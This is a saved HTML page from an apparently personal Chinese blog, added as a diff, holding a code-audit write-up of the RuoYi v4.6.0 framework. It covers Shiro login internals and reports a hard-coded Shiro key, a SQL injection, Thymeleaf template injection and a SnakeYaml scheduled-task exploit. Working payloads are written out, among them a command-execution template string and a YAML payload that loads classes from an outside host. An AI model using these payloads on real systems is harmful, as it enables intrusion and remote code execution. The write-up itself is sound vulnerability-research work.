@@ -1,0 +1,304 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>java代码审计——若依v4.6.0 | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="继续审计框架源码，这次审计若依的一个比较老的版本，它是一个基于SpringBoot的权限管理系统，采用该站点的系统还是挺多的，所以研究这种大型，大众化的框架漏洞还是比较有价值的。 若依采用的核心技术：  SpringBoot Mybatis Shiro Thymeleaf Bootstrap  0x01 前言该框架有很多模块，后端代码目录介绍如下   几个模块的依赖关系如下   所以applica">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java代码审计——若依v4.6.0">
+<meta property="og:url" content="https://xilitter.github.io/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="继续审计框架源码，这次审计若依的一个比较老的版本，它是一个基于SpringBoot的权限管理系统，采用该站点的系统还是挺多的，所以研究这种大型，大众化的框架漏洞还是比较有价值的。 若依采用的核心技术：  SpringBoot Mybatis Shiro Thymeleaf Bootstrap  0x01 前言该框架有很多模块，后端代码目录介绍如下   几个模块的依赖关系如下   所以applica">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art/a11.jpg">
+<meta property="article:published_time" content="2024-05-11T07:14:43.000Z">
+<meta property="article:modified_time" content="2024-05-11T13:48:06.962Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="java代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art/a11.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java代码审计——若依v4.6.0',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-11 21:48:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art/a11.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">java代码审计——若依v4.6.0</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-11T07:14:43.000Z" title="发表于 2024-05-11 15:14:43">2024-05-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-11T13:48:06.962Z" title="更新于 2024-05-11 21:48:06">2024-05-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="java代码审计——若依v4.6.0"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>继续审计框架源码，这次审计若依的一个比较老的版本，它是一个基于SpringBoot的权限管理系统，采用该站点的系统还是挺多的，所以研究这种大型，大众化的框架漏洞还是比较有价值的。</p>
+<p>若依采用的核心技术：</p>
+<ol>
+<li>SpringBoot</li>
+<li>Mybatis</li>
+<li>Shiro</li>
+<li>Thymeleaf</li>
+<li>Bootstrap</li>
+</ol>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>该框架有很多模块，后端代码目录介绍如下</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/1.png" class>
+
+<p>几个模块的依赖关系如下</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/2.png" class>
+
+<p>所以application 启动类在 admin 模块里。启动成功后游览器访问就是一个后台登录页面。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/3.png" class>
+
+<h3 id="若依中shiro的权限问题"><a href="#若依中shiro的权限问题" class="headerlink" title="若依中shiro的权限问题"></a>若依中shiro的权限问题</h3><p>权限管理采用了shiro框架，首先需要看看若依中的shiro是如何管理登录和限制权限的。</p>
+<p>登录的控制器方法如下：</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/4.png" class>
+
+<p>账号密码为参数生成一个token对象，这里有shiro的关键标志，就是remberMe。然后调用 getSubject方法获取一个主体。那什么是Subject主体主体，若依的官方文档是这么说的：</p>
+<blockquote>
+<p>Subject主体，代表了当前的“用户”，这个用户不一定是一个具体的人，与当前应用交互的任何东西都是Subject</p>
+</blockquote>
+<p>然后就调用它的 login 方法</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/5.png" class>
+
+<p>这里会调用 securityManager 类的 login 方法</p>
+<p>安全管理器 SecurityManager</p>
+<blockquote>
+<p>与Subject的所有交互都会委托给SecurityManager；可以把Subject认为是一个门面；SecurityManager才是实际的执行者<br>SecurityManage安全管理器；即所有与安全有关的操作都会与SecurityManager交互；且它管理着所有Subject； 可以看出它是Shiro的核心，它负责与后边介绍的其他组件进行交互</p>
+</blockquote>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/6.png" class>
+
+<p>跟进到 authenticate 方法，在这里</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/7.png" class>
+
+<p>它获取到一个 realms</p>
+<blockquote>
+<p>Realm域，Shiro从Realm获取安全数据（如用户，角色，权限），就是说SecurityManager要验证用户身份，  那么它需要从Realm获取相应的用户进行比较以确定用户身份是否合法；也需要从Realm得到用户相应的角色&#x2F;权限进行验证用户是否能进行操作</p>
+</blockquote>
+<p>可以说是用它来做登录认证的。</p>
+<p>最后就会调用到 自定义的 UserRealm 类的 doGetAuthenticationInfo 方法</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/8.png" class>
+
+<p>到这就走到了 service 层的 login 方法，后续就是正常的验证过程，没必要跟了。</p>
+<p>我们在控制器中经常会看到这种注解</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/9.png" class>
+
+<p>用于做权限管理的，在UserRealm 类也有这方面的体现</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/10.png" class>
+
+<p>admin 角色是拥有所有权限的，体会到了权限管理的一种思想。</p>
+<h2 id="0x02-初步审计"><a href="#0x02-初步审计" class="headerlink" title="0x02 初步审计"></a>0x02 初步审计</h2><p>看一下依赖库中有什么组件</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/11.png" class>
+
+<p>fastjson 版本太高了，可能会存在漏洞。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/12.png" class>
+
+<p>刚才提到过的 shiro，拿到了源代码，可以去看看密钥是否硬编码。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/13.png" class>
+
+<p>可能会有模板注入，具体的还需要全局搜索漏洞函数。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/14.png" class>
+
+<p>该版本存在反序列化的漏洞，就看是否能找到反序列化点了。</p>
+<p>值得我们去研究的依赖就这么多，接下来看看过滤器，过滤器中没有去权限验证的代码，因为shiro 已经做了，该框架就只有一个针对于防范XSS攻击的过滤器。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/15.png" class>
+
+<p>用 EscapeUtil 工具类去防御这个xss，看看写的正则匹配规则。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/16.png" class>
+
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/17.png" class>
+
+<p>看样子过滤的很死。</p>
+<h2 id="0x03-漏洞审计"><a href="#0x03-漏洞审计" class="headerlink" title="0x03 漏洞审计"></a>0x03 漏洞审计</h2><h3 id="1-shiro反序列化"><a href="#1-shiro反序列化" class="headerlink" title="1. shiro反序列化"></a>1. shiro反序列化</h3><p>找找该框架的密钥，可以搜索 setCipherKey 等关键字</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/18.png" class>
+
+<p>这里直接定位到 cipherKey 了。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/19.png" class>
+
+<p>固定的key，能打，那就直接可以一把梭了，上工具。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/20.png" class>
+
+<p>命令执行成功，这也就是唯一不需要登录后台getshell的漏洞了。</p>
+<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2. SQL注入"></a>2. SQL注入</h3><p>使用的Mybatis，那么直接搜索${}就好了。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/21.png" class>
+
+<p>这个地方会造成一个sql语句的拼接，回溯 selectUserList 方法来到控制层。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/22.png" class>
+
+<p>这里要求传递的是一个javabean，传递的参数就是javabean的属性，最重要的是需要传参params[‘dataScope’]，还有就是需要登录后台。</p>
+<p>POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/system/user/list</span><br><span class="line">POST：</span><br><span class="line">pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/23.png" class>
+
+<h3 id="3-Thymeleaf模板注入"><a href="#3-Thymeleaf模板注入" class="headerlink" title="3. Thymeleaf模板注入"></a>3. Thymeleaf模板注入</h3><p>本框架采用的是 Thymeleaf 模板引擎去渲染模板，Thymeleaf 模板注入漏洞存在形式分为：</p>
+<p>return 内容可控，URL路径可控，还有模板文件内容可控。全局搜索 ::”，</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/24.png" class>
+
+<p>找到一处，在CacheController控制器</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/25.png" class>
+
+<p>输入如下POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__*%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/26.png" class>
+
+<p>成功弹出计算器。</p>
+<h3 id="4-计划任务RCE"><a href="#4-计划任务RCE" class="headerlink" title="4. 计划任务RCE"></a>4. 计划任务RCE</h3><p>本来这用的是SnakeYaml 反序列化来打，全局搜索 Yaml.load 方法是搜不到的，它这里是反射调用任意类的任意方法。这里先复现一下漏洞。</p>
+<p>在后台系统监控中有一个定时任务，添加一个定时任务</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/27.png" class>
+
+<p>在目标字符串添加 SnakeYaml 反序列化 的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://1d60a57d72.ipv6.1433.eu.org.&quot;]]]]&#x27;)</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/28.png" class>
+
+<p>点击执行一次。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/29.png" class>
+
+<p>收到DNS解析记录。</p>
+<p>抓包看它的路由是在 &#x2F;monitor&#x2F;job&#x2F;run，对应控制器代码如下</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/30.png" class>
+
+<p>但是我跟调走不到调用函数那一块，就只看到了将任务加入到调度器里用于某时刻触发立即执行。调试到第二个流才到 invokeMethod 方法里，但是判断它这个立即触发的代码还没找到。</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/31.png" class>
+
+<p>解析我们输入的字符串，提取JavaBean类，方法，以及参数值</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/32.png" class>
+
+<p>这里就正常的反射获取方法并调用，实际上就是调用了 Yaml.load 反序列化方法。能不能调用Runtime.exec方法直接执行命令呢？</p>
+<p>通过调式不行</p>
+<img src="/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/33.png" class>
+
+<p>在这里会报错，因为 java.lang.Runtime 没有公共的无参构造方法，所以会抛出异常。</p>
+<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h2><p>该版本的若依就分析到这，只有一个shiro能够前台rce，并且很容易修复，权限管理的很死，几乎都没有能够不登陆的状态下能够访问的路由，可能也是因为若依是后台管理系统的缘故吧。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/">https://xilitter.github.io/2024/05/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E8%8B%A5%E4%BE%9Dv4-6-0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">java代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/art/a11.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/05/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94Jfinalcms/" title="java代码审计——Jfinalcms"><img class="cover" src="/img/art/a7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java代码审计——Jfinalcms</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/30/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP-v2-3/" title="java代码审计--华夏ERP_v2.3"><img class="cover" src="/img/art/a4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-30</div><div class="title">java代码审计--华夏ERP_v2.3</div></div></a></div><div><a href="/2024/05/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94Jfinalcms/" title="java代码审计——Jfinalcms"><img class="cover" src="/img/art/a7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-07</div><div class="title">java代码审计——Jfinalcms</div></div></a></div><div><a href="/2024/04/17/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94Jspxcms/" title="java代码审计——Jspxcms"><img class="cover" src="/img/art/a10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-17</div><div class="title">java代码审计——Jspxcms</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div 